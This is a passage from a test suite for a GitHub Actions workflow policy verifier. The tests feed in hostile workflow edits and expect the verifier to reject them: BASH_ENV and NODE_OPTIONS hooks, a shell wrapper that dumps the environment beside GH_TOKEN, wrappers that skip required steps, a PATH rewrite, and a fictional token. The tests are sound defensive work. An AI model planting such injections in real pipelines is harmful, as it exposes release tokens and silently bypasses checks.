        "          GH_TOKEN: ${{ github.token }}\n          BASH_ENV: ./release-wrapper.sh",
    },
  ])("rejects GH_TOKEN with $name", async ({ before, after }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(before, after),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
    });
  });

  it("rejects release job defaults.run.shell wrappers", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(
          "    timeout-minutes: 10\n    permissions:\n      contents: write\n",
          `    timeout-minutes: 10
    defaults:
      run:
        shell: bash -c 'env; {0}'
    permissions:
      contents: write
`,
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_SHELL_POLICY)");
    });
  });

  it.each([
    {
      name: "a workflow-level BASH_ENV hook",
      before: "permissions:\n",
      after: "env:\n  BASH_ENV: ./release-wrapper.sh\n\npermissions:\n",
    },
    {
      name: "a release-job BASH_ENV hook",
      before:
        "    timeout-minutes: 10\n    permissions:\n      contents: write\n",
      after:
        "    timeout-minutes: 10\n    env:\n      BASH_ENV: ./release-wrapper.sh\n    permissions:\n      contents: write\n",
    },
    {
      name: "a release-job NODE_OPTIONS hook",
      before:
        "    timeout-minutes: 10\n    permissions:\n      contents: write\n",
      after:
        "    timeout-minutes: 10\n    env:\n      NODE_OPTIONS: --require ./release-wrapper.cjs\n    permissions:\n      contents: write\n",
    },
    {
      name: "a release-job ENV hook",
      before:
        "    timeout-minutes: 10\n    permissions:\n      contents: write\n",
      after:
        "    timeout-minutes: 10\n    env:\n      ENV: ./release-wrapper.sh\n    permissions:\n      contents: write\n",
    },
  ])("rejects GH_TOKEN inheritance beside $name", async ({ before, after }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(before, after),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_EXECUTION_POLICY)");
    });
  });

  it("rejects release precursor steps that can rewrite the gh executable", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(
          "      - name: Create or update the verified GitHub release\n",
          `      - name: Rewrite the command search path
        run: echo "./bin" >> "$GITHUB_PATH"
      - name: Create or update the verified GitHub release
`,
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_EXECUTION_POLICY)");
    });
  });

  it.each([
    {
      name: "a missing checkout step",
      before: `      - name: Check out source
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
        with:
          persist-credentials: false
`,
      after: "",
      code: "RELEASE_CHECKOUT_REQUIRED",
    },
    {
      name: "missing persist-credentials",
      before: `        with:
          persist-credentials: false
`,
      after: "",
      code: "CHECKOUT_CREDENTIAL_PERSISTENCE",
    },
    {
      name: "persist-credentials enabled",
      before: "          persist-credentials: false",
      after: "          persist-credentials: true",
      code: "CHECKOUT_CREDENTIAL_PERSISTENCE",
    },
  ])("rejects verify-package checkout with $name", async (fixture) => {
    await withPolicyFixture(async (fixtureRoot) => {
      expect(validFutureReleaseWorkflow).toContain(fixture.before);
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain(`(${fixture.code})`);
    });
  });

  it("accepts the three-stage least-privilege release workflow", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow,
      );

      const result = await runVerifier(fixtureRoot);
      expect(result.stderr).toBe("");
      expect(result.stdout).toBe(
        "Workflow policy check passed: 4 workflows and 2 dependency ecosystems.\n",
      );
    });
  });

  it.each([
    {
      name: "an include entry",
      addition: `
        include:
          - os: ubuntu-latest
            node-version: 22
            experimental: true`,
    },
    {
      name: "a self-hosted include entry",
      addition: `
        include:
          - os: self-hosted
            node-version: 22`,
    },
    {
      name: "an exclude entry",
      addition: `
        exclude:
          - os: windows-latest
            node-version: 24`,
    },
    {
      name: "an extra architecture dimension",
      addition: `
        architecture: [x64]`,
    },
  ])("rejects a package matrix with $name", async ({ addition }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[1]);
      const source = await readFile(target, "utf8");
      const marker = "        node-version: [22, 24]";
      expect(source).toContain(marker);
      await writeFile(
        target,
        source.replace(marker, `${marker}${addition}`),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(PACKAGE_MATRIX_SHAPE)");
    });
  });

  it.each([
    {
      name: "a job-level if expression",
      before: "    timeout-minutes: 25\n",
      after: "    timeout-minutes: 25\n    if: ${{ false }}\n",
    },
    {
      name: "job-level continue-on-error set to false",
      before: "    timeout-minutes: 25\n",
      after: "    timeout-minutes: 25\n    continue-on-error: false\n",
    },
    {
      name: "a required-step if set to false",
      before: "        run: npm run package:verify\n",
      after: "        if: false\n        run: npm run package:verify\n",
    },
    {
      name: "a required-step continue-on-error expression",
      before: "        run: npm run package:verify\n",
      after:
        "        continue-on-error: ${{ false }}\n        run: npm run package:verify\n",
    },
  ])("rejects package smoke with $name", async ({ before, after }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[1]);
      const source = await readFile(target, "utf8");
      expect(source).toContain(before);
      await writeFile(target, source.replace(before, after), "utf8");

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(PACKAGE_EXECUTION_POLICY)");
    });
  });

  it.each([
    {
      name: "a workflow-level BASH_ENV hook",
      before: '  GITHUB_STARS_MCP_READ_ONLY: "true"\n',
      after:
        '  GITHUB_STARS_MCP_READ_ONLY: "true"\n  BASH_ENV: ./skip-package.sh\n',
    },
    {
      name: "job defaults that replace every run command",
      before: "    timeout-minutes: 25\n",
      after:
        "    timeout-minutes: 25\n    defaults:\n      run:\n        shell: \"bash -c 'true # {0}'\"\n",
    },
    {
      name: "a job-level NODE_OPTIONS hook",
      before: "    timeout-minutes: 25\n",
      after:
        "    timeout-minutes: 25\n    env:\n      NODE_OPTIONS: --require ./skip-package.cjs\n",
    },
    {
      name: "a required-step shell wrapper",
      before: "        run: npm run package:verify\n",
      after:
        "        shell: \"bash -c 'true # {0}'\"\n        run: npm run package:verify\n",
    },
    {
      name: "a required-step BASH_ENV hook",
      before: "        run: npm run package:verify\n",
      after:
        "        env:\n          BASH_ENV: ./skip-package.sh\n        run: npm run package:verify\n",
    },
    {
      name: "a required-step working-directory rewrite",
      before: "        run: npm run package:verify\n",
      after:
        "        working-directory: ./fixtures/noop-package\n        run: npm run package:verify\n",
    },
    {
      name: "checkout redirected away from the tested commit",
      before: "          persist-credentials: false\n",
      after: "          persist-credentials: false\n          ref: main\n",
    },
    {
      name: "setup-node detached from the Node matrix",
      before: "          node-version: ${{ matrix.node-version }}\n",
      after: "          node-version: 22\n",
    },
  ])(
    "rejects package execution rewrite via $name",
    async ({ before, after }) => {
      await withPolicyFixture(async (fixtureRoot) => {
        const target = resolve(fixtureRoot, workflowPaths[1]);
        const source = await readFile(target, "utf8");
        expect(source).toContain(before);
        await writeFile(target, source.replace(before, after), "utf8");

        const stderr = await verifierFailure(fixtureRoot);
        expect(stderr).toContain("(PACKAGE_EXECUTION_POLICY)");
      });
    },
  );

  it.each([
    {
      name: "CI verify",
      path: ".github/workflows/ci.yml",
      before: "        run: npm run verify:all\n",
      after:
        "        shell: \"bash -c 'true # {0}'\"\n        run: npm run verify:all\n",
      code: "CI_EXECUTION_POLICY",
    },
    {
      name: "CI checkout",
      path: ".github/workflows/ci.yml",
      before: "          persist-credentials: false\n",
      after: "          persist-credentials: false\n          ref: main\n",
      code: "CI_EXECUTION_POLICY",
    },
    {
      name: "CodeQL build",
      path: ".github/workflows/codeql.yml",
      before: "        run: npm run build\n",
      after:
        "        env:\n          BASH_ENV: ./skip-codeql.sh\n        run: npm run build\n",
      code: "CODEQL_EXECUTION_POLICY",
    },
    {
      name: "CodeQL setup-node",
      path: ".github/workflows/codeql.yml",
      before: "          node-version: 24\n",
      after: "          node-version: 22\n",
      code: "CODEQL_EXECUTION_POLICY",
    },
  ])("rejects $name execution rewrites", async (fixture) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, fixture.path);
      const source = await readFile(target, "utf8");
      expect(source).toContain(fixture.before);
      await writeFile(
        target,
        source.replace(fixture.before, fixture.after),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain(`(${fixture.code})`);
    });
  });

  it.each([
    {
      name: "an unpinned action",
      path: ".github/workflows/ci.yml",
      before: pins.checkout,
      after: "actions/checkout@v4",
      code: "UNPINNED_ACTION",
    },
    {
      name: "a broad write permission",
      path: ".github/workflows/ci.yml",
      before: "contents: read",
      after: "contents: write",
      code: "PERMISSION_WRITE_FORBIDDEN",
    },
    {
      name: "a live mutation token",
      path: ".github/workflows/ci.yml",
      before: 'GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'GITHUB_STARS_MCP_READ_ONLY: "true"\n  GITHUB_STARS_TOKEN: "ghp_FICTIONAL_VALUE_MUST_NOT_PRINT"',
      code: "LIVE_TOKEN_REFERENCE",
    },
    {
      name: "a disabled read-only gate",
      path: ".github/workflows/ci.yml",
      before: 'GITHUB_STARS_MCP_READ_ONLY: "true"',
      after: 'GITHUB_STARS_MCP_READ_ONLY: "false"',
      code: "READ_ONLY_REQUIRED",
    },
    {
      name: "an incomplete Node matrix",
      path: ".github/workflows/ci.yml",
      before: "node-version: [22, 24]",
      after: "node-version: [24]",
      code: "CI_NODE_MATRIX",
    },
    {
      name: "an unbounded dependency queue",
      path: ".github/dependabot.yml",
      before: "open-pull-requests-limit: 10",
      after: "open-pull-requests-limit: 11",
      code: "DEPENDABOT_PULL_REQUEST_LIMIT",
    },
    {
      name: "a YAML anchor",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'x-read-only: &read-only "true"\nenv:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      code: "YAML_ANCHOR_FORBIDDEN",
    },
    {
      name: "an anchored Node matrix",
      path: ".github/workflows/ci.yml",
      before: "matrix:\n        node-version: [22, 24]",
      after: "matrix: &node-matrix\n        node-version: [22, 24]",
      code: "YAML_ANCHOR_FORBIDDEN",
    },
    {
      name: "an anchored action reference",
      path: ".github/workflows/ci.yml",
      before: pins.checkout,
      after: `&checkout-action ${pins.checkout}`,
      code: "YAML_ANCHOR_FORBIDDEN",
    },
    {
      name: "a YAML alias",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'x-ci-env: &ci-env\n  GITHUB_STARS_MCP_READ_ONLY: "true"\nenv: *ci-env',
      code: "YAML_ALIAS_FORBIDDEN",
    },
    {
      name: "a YAML merge key",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'x-shared-env: &shared-env\n  SAFE_FLAG: "true"\nenv:\n  <<: *shared-env\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      code: "YAML_MERGE_KEY_FORBIDDEN",
    },
    {
      name: "a custom YAML tag",
      path: ".github/workflows/ci.yml",
      before: 'GITHUB_STARS_MCP_READ_ONLY: "true"',
      after: 'GITHUB_STARS_MCP_READ_ONLY: !unsafe "true"',
      code: "YAML_CUSTOM_TAG_FORBIDDEN",
    },
    {
      name: "a dynamic YAML mapping key",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"\n  ? [GITHUB_STARS_TOKEN]\n  : "hidden"',
      code: "YAML_DYNAMIC_KEY_FORBIDDEN",
    },
  ])("rejects $name without echoing source values", async (fixture) => {
    const fixtureRoot = await mkdtemp(join(tmpdir(), "workflow-policy-"));
    try {
      await cp(
        resolve(repositoryRoot, ".github"),
        resolve(fixtureRoot, ".github"),
        { recursive: true },
      );
      const target = resolve(fixtureRoot, fixture.path);
      const source = await readFile(target, "utf8");
      expect(source).toContain(fixture.before);
      await writeFile(
        target,
        source.replace(fixture.before, fixture.after),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain(`(${fixture.code})`);
      expect(stderr).not.toContain("ghp_FICTIONAL_VALUE_MUST_NOT_PRINT");
    } finally {
      await rm(fixtureRoot, { recursive: true, force: true });
    }
  });
});
